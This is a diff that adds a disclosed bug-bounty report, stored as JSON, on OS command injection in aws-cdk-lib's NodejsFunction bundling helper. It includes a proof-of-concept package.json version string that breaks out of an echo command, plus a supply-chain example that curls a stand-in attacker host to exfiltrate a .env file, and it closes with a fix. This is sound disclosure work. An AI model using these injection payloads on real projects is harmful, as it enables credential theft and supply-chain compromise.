@@ -1,0 +1,126 @@
+{
+  "id": 3637898,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNjM3ODk4",
+  "url": "https://hackerone.com/reports/3637898",
+  "title": "OS Command Injection in `aws-cdk-lib` NodejsFunction via Unsanitized `OsCommand` Helper (Supply Chain RCE)",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2026-03-30T12:48:06.786Z",
+  "submitted_at": "2026-03-30T12:48:07.193Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "kaporia",
+    "url": "/kaporia",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 84809,
+    "url": "https://hackerone.com/aws_vdp",
+    "handle": "aws_vdp",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/fgfqam8gl7lzo8u8v0kiphkxfyt8/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/fgfqam8gl7lzo8u8v0kiphkxfyt8/1d3351b56b27c9bb56ce22821a57514a7210186a77aefb760cd2113272723c1f"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "AWS VDP",
+      "twitter_handle": "amazon",
+      "website": "https://aws.amazon.com/",
+      "about": "Amazon Web Services (AWS) is a secure cloud services platform, offering compute power and other functionality to help businesses scale and grow. "
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-07-06T17:48:30.989Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-07-06T15:16:38.518Z",
+  "team_member_agreed_on_going_public_at": "2026-07-06T17:48:30.190Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Asset:** `aws-cdk-lib` (npm package), source: https://github.com/aws/aws-cdk\n**Severity:** High\n**CWE:** CWE-78 (Improper Neutralization of Special Elements used in an OS Command, 'OS Command Injection')\n\n---\n\n## Summary\nThe `NodejsFunction` construct in `aws-cdk-lib/aws-lambda-nodejs` uses an internal helper class named `OsCommand` to construct shell commands during Docker-based bundling. The `OsCommand.write()` and `OsCommand.writeJson()` methods wrap user-controlled data in single quotes (`echo '${data}'`) without escaping embedded single quotes.\n\nWhen `nodeModules` is specified, the CDK reads dependency version strings from `package.json` via `extractDependencies()`, serializes them with `JSON.stringify()`, and passes them through `OsCommand.writeJson()`. Because `JSON.stringify()` preserves single quotes, a malicious dependency version containing `'` characters breaks out of the `echo` command and injects arbitrary shell commands.\n\nThe injected commands execute inside a Docker container that has **bind mounts** to the host filesystem:\n- `/asset-input` → host project directory (read/write)\n- `/asset-output` → host `.cdk.staging` directory (read/write)\n\nThis enables a **supply chain attack**: a malicious npm package with a crafted version string can achieve arbitrary command execution on any developer machine or CI/CD pipeline running `cdk synth` or `cdk deploy`.\n\n---\n\n## Why This is NOT Covered by Existing CDK Security Warnings\n\nAWS CDK displays security warnings during `cdk synth` for user-facing APIs like `commandHooks` and `goBuildFlags`, these are explicitly developer-provided shell commands.\n\n**This vulnerability is fundamentally different.** The injection occurs inside the CDK's own internal `OsCommand` helper class. The developer never writes a shell command. They simply declare standard npm dependencies in `package.json`. The CDK's internal code then unsafely interpolates version strings into a `bash -c` command **without any warning or sanitization**.\n\nNo existing CDK security warning covers this code path.\n\n---\n\n## Vulnerable Code\n**File:** [`packages/aws-cdk-lib/aws-lambda-nodejs/lib/bundling.ts`](https://github.com/aws/aws-cdk/blob/main/packages/aws-cdk-lib/aws-lambda-nodejs/lib/bundling.ts)\n\n1. ### `OsCommand.write()` Single-quote injection\n```typescript\npublic write(filePath: string, data: string): string {\n    // ...\n    return `echo '${data}' > \"${filePath}\"`;\n    //           ^ NO ESCAPING — single quotes in data break out\n}\n```\n\n2. ### `OsCommand.writeJson()` calls `write()` with JSON.stringify output\n```typescript\npublic writeJson(filePath: string, data: object): string {\n    const stringifiedData = JSON.stringify(data);\n    return this.write(filePath, stringifiedData);\n    //     ^ JSON.stringify preserves single quotes from input\n}\n```\n\n3. ### Docker bundling command assembly\nWhen `nodeModules` is specified, `bundling.ts` constructs a Docker command:\n```typescript\ndepsCommand = chain([\n    osCommand.writeJson(pathJoin(options.outputDir, 'package.json'), { dependencies }),\n    osCommand.copy(lockFilePath, pathJoin(options.outputDir, this.packageManager.lockFile)),\n    osCommand.changeDirectory(options.outputDir),\n    this.packageManager.installCommand.join(' '),\n]);\n```\nThis `depsCommand` is executed inside Docker via `bash -c`.\n\n4. ### Existing (unused) escape function\nThe same file contains a `posixShellEscape` helper, but it is **not applied** to `OsCommand`:\n```typescript\nfunction posixShellEscape(arg: string): string {\n    return \"'\" + arg.replace(/'/g, \"'\\\\''\") + \"'\";\n}\n```\n\n---\n\n## Proof of Concept (Verified)\n\n### Prerequisites\n- Node.js installed\n- Docker installed and running\n- npm installed\n\n### Step 1: Create the project\n```bash\nmkdir cdk_poc_oscommand\ncd cdk_poc_oscommand\nnpm init -y\n```\n\n### Step 2: Install dependencies\n```bash\nnpm install aws-cdk-lib constructs aws-cdk typescript ts-node @types/node lodash\n```\n\n### Step 3: Create `tsconfig.json`\n```json\n{\n  \"compilerOptions\": {\n    \"target\": \"es2020\",\n    \"module\": \"commonjs\",\n    \"strict\": true,\n    \"skipLibCheck\": true,\n    \"esModuleInterop\": true,\n    \"outDir\": \"dist\",\n    \"types\": [\"node\"]\n  }\n}\n```\n\n### Step 4: Create `cdk.json`\n```json\n{\n  \"app\": \"npx ts-node app.ts\"\n}\n```\n\n### Step 5: Create `lambda/handler.js`\n```bash\nmkdir lambda\n```\n```javascript\n// lambda/handler.js\nexports.handler = async function() { return \"OK\"; }\n```\n\n### Step 6: Create `app.ts`\n```typescript\nimport * as cdk from 'aws-cdk-lib';\nimport { NodejsFunction } from 'aws-cdk-lib/aws-lambda-nodejs';\nimport { Runtime } from 'aws-cdk-lib/aws-lambda';\nimport * as path from 'path';\n\nconst app = new cdk.App();\nconst stack = new cdk.Stack(app, 'ReproStack');\n\nnew NodejsFunction(stack, 'MyHandler', {\n  entry: path.join(__dirname, 'lambda', 'handler.js'),\n  runtime: Runtime.NODEJS_20_X,\n  bundling: {\n    forceDockerBundling: true,\n    nodeModules: ['lodash'],\n  },\n});\n\napp.synth();\n```\n\n### Step 7: Inject the payload into `package.json`\nEdit the `lodash` dependency version in `package.json`:\n```json\n{\n  \"dependencies\": {\n    \"lodash\": \"4.17.21' && touch /asset-input/pwned_via_json.txt && echo '\"\n  }\n}\n```\n> **Note:** Leave all other dependencies unchanged. Only the `lodash` version needs the payload.\n\n### Step 8: Run `cdk synth`\n```bash\nnpx cdk synth\n```\n\n### Step 9: Verify the payload executed on the HOST filesystem\n```bash\n# Linux/macOS:\nls -la pwned_via_json.txt\n\n# Windows (PowerShell):\nTest-Path pwned_via_json.txt\n```\n\n**Expected output:** The file `pwned_via_json.txt` exists in the project root directory on the **host machine**.\n\n---\n\n## Verified Output\n\n### Docker command generated by CDK (from actual execution log):\n```bash\ndocker run --rm -u \"1000:1000\" \\\n  -v \"C:\\\\h1\\\\AWS VDP\\\\cdk_poc_oscommand:/asset-input:delegated\" \\\n  -v \"C:\\\\h1\\\\AWS VDP\\\\cdk_poc_oscommand\\\\cdk.out\\\\bundling-temp-...:/asset-output:delegated\" \\\n  -w \"/\" cdk-79d7bc6c... \\\n  bash -c \"'esbuild' '--bundle' '/asset-input/lambda/handler.js' \\\n  '--target=node20' '--platform=node' '--outfile=/asset-output/index.js' \\\n  '--external:@aws-sdk/*' '--external:lodash' && \\\n  echo '{\\\"dependencies\\\":{\\\"lodash\\\":\\\"4.17.21' && \\\n  touch /asset-input/pwned_via_json.txt && \\\n  echo '\\\"}}' > \\\"/asset-output/package.json\\\" && \\\n  cp \\\"/asset-input/package-lock.json\\\" \\\"/asset-output/package-lock.json\\\" && \\\n  cd \\\"/asset-output\\\" && npm ci\"\n```\n\nThe single-quote injection splits the `echo` command into three separate shell commands:\n1. `echo '{\"dependencies\":{\"lodash\":\"4.17.21'`, truncated echo (harmless)\n2. **`touch /asset-input/pwned_via_json.txt`**, **PAYLOAD EXECUTES**\n3. `echo '\"}}' > \"/asset-output/package.json\"`, broken JSON written\n\n### Host filesystem verification:\n```powershell\nPS> Test-Path \"████████\\pwned_via_json.txt\"\nTrue\n```\n\n---\n\n## Real-World Attack Scenario (Supply Chain)\n\nA malicious actor publishes an npm package (e.g., `@company/analytics-helper`) with a crafted `package.json`:\n```json\n{\n  \"name\": \"@company/analytics-helper\",\n  \"version\": \"2.1.0\",\n  \"dependencies\": {\n    \"lodash\": \"4.17.21' && curl https://attacker.com/exfil?d=$(cat /asset-input/.env|base64) && echo '\"\n  }\n}\n```\n\nWhen a developer installs this package and runs `cdk synth` with `nodeModules`, the CDK's `extractDependencies()` reads the version string and injects it into a Docker `bash -c` command. The attacker exfiltrates the developer's `.env` file (containing AWS credentials, API keys, etc.) without the developer ever seeing a shell command or a security warning.\n\n---\n\n## Addressing Potential Mitigations\n\n### \"Docker provides isolation\"\nThe Docker container uses **bind mounts** that map `/asset-input` to the host's project directory. Injected commands can read, modify, or delete files on the **host filesystem**, including `.env`, `.git/config`, source code, and potentially `~/.aws/credentials` if the project root is a parent directory.\n\n### \"The developer controls `package.json`\"\nIn the supply chain scenario, the developer does **not** control the version strings of transitive dependencies. A malicious npm package deep in the dependency tree can inject arbitrary commands through its own `package.json` version declarations.\n\n### \"This is similar to `commandHooks`\"\nNo. `commandHooks` is a **user-facing API** where the developer explicitly provides shell commands. CDK correctly warns about this. `OsCommand` is an **internal implementation detail**, the developer provides standard `package.json` dependency declarations and has no visibility into the shell commands generated internally.\n\n---\n\n## Remediation\nApply the existing `posixShellEscape` function (already in `bundling.ts`) to all `OsCommand` methods:\n\n```typescript\nclass OsCommand {\n  public write(filePath: string, data: string): string {\n    if (this.osPlatform === 'win32') { ... }\n    return `echo ${posixShellEscape(data)} > ${posixShellEscape(filePath)}`;\n  }\n\n  public copy(src: string, dest: string): string {\n    if (this.osPlatform === 'win32') { ... }\n    return `cp ${posixShellEscape(src)} ${posixShellEscape(dest)}`;\n  }\n}\n```\n\n## Impact\n\nThis vulnerability allows a remote attacker to achieve arbitrary Remote Code Execution (RCE) on the host machine where `cdk synth` or `cdk deploy` is executed. Through the use of a malicious npm dependency, the attacker can invisibly execute commands within the Docker bundling container, which shares bind mounts (`/asset-input` and `/asset-output`) with the host filesystem. This grants the attacker full read, write, and delete access to the developer's project directory, allowing them to exfiltrate sensitive secrets (such as `.env` files or AWS credentials), tamper with the deployed Lambda artifacts to insert backdoors, or compromise automated CI/CD pipelines.\n\n**CVSS 3.1 Score:** 8.6 (High) `CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H`\n*   **Attack Vector (Local):** The victim must pull the malicious package locally (or in a CI/CD runner) and execute the CDK CLI tool.\n*   **User Interaction (Required):** The victim must run `cdk synth` or `cdk deploy`.\n*   **Scope (Changed):** The command starts within the Docker container context but escapes to affect the host filesystem via bind mounts.\n*   **Confidentiality, Integrity, Availability (High):** The attacker gains arbitrary code execution, allowing full read/write access to project files, secrets, and system resources.",
+  "weakness": {
+    "id": 59,
+    "name": "OS Command Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 3,
+  "voters": [
+    "berrinbounty",
+    "oxm14r41",
+    "kaporia"
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 7.3,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "local",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 680609,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/aws/aws-cdk",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
